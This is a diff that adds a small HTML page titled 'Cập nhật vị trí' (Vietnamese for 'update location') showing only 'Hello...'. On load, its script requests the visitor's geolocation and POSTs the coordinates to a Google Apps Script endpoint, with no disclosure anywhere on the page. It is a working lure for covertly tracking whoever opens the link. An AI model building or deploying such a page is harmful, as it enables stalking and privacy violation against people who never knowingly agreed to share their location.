@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cập nhật vị trí</title>
+    <script>
+        function sendLocation(latitude, longitude) {
+            fetch('https://script.google.com/macros/s/AKfycbzZi-4kdTKCbzsyBT8FYP5LRagOiH78_5y3IjWpO3vPFwMSpEjJo7bPA8XQHZ5Dc6OojA/exec', {  // Thay bằng URL đã tạo
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ latitude, longitude })
+            })
+            .then(response => response.text())
+            .then(data => console.log('Location sent:', data))
+            .catch(error => console.error('Error sending location:', error));
+        }
+        
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    sendLocation(position.coords.latitude, position.coords.longitude);
+                }, error => {
+                    console.error('Error getting location:', error);
+                });
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+            }
+        }
+        
+        window.onload = getLocation;
+    </script>
+</head>
+<body>
+    <h1>Hello...</h1>
+</body>
+</html>
